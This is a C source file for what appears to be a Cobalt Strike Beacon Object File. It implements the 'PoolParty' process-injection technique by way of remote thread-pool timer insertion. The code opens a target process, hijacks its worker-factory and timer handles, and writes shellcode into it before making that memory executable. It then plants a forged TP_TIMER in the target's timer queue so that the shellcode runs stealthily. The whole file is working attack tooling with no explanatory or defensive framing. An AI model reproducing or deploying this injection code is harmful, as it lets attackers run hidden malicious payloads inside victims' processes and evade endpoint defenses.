#include "PoolParty.h"

void RemoteTpTimerInsertion(HANDLE hTarget, LPVOID pShellcodeAddress) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    _NtSetTimer2 NtSetTimer2 = (_NtSetTimer2)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetTimer2"));
    
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hTpWorkerFactory);
    PFULL_TP_TIMER pTpTimer = (PFULL_TP_TIMER)KERNEL32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(pShellcodeAddress), NULL, NULL);
    PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    int Timeout = -10000000;
    pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
    pTpTimer->DueTime = Timeout;
    pTpTimer->WindowStartLinks.Key = Timeout;
    pTpTimer->WindowEndLinks.Key = Timeout;
    pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
    pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

    NtWriteVirtualMemory(hTarget, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), NULL);

    PVOID TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
    NtWriteVirtualMemory(hTarget, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, (PVOID)(&TpTimerWindowStartLinks), sizeof(TpTimerWindowStartLinks), NULL);

    PVOID TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
    NtWriteVirtualMemory(hTarget, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, (PVOID)(&TpTimerWindowEndLinks), sizeof(TpTimerWindowEndLinks), NULL);

    LARGE_INTEGER ulDueTime = { 0 };
    ulDueTime.QuadPart = Timeout;
    T2_SET_PARAMETERS Parameters = { 0 };
    NtSetTimer2(hIRTimer, &ulDueTime, 0, &Parameters);
}

void Inject8(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    
    HANDLE hTarget = NULL;
    DWORD dwOldProtect = NULL;
    hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
    
    if (hTarget) {
        HijackTpWorkerFactoryHandle(hTarget, WORKER_FACTORY_ALL_ACCESS);
        HijackIRTimerHandle(hTarget, TIMER_ALL_ACCESS);

        PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
        KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
        
        RemoteTpTimerInsertion(hTarget, pShellcodeAddress);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
    }
}
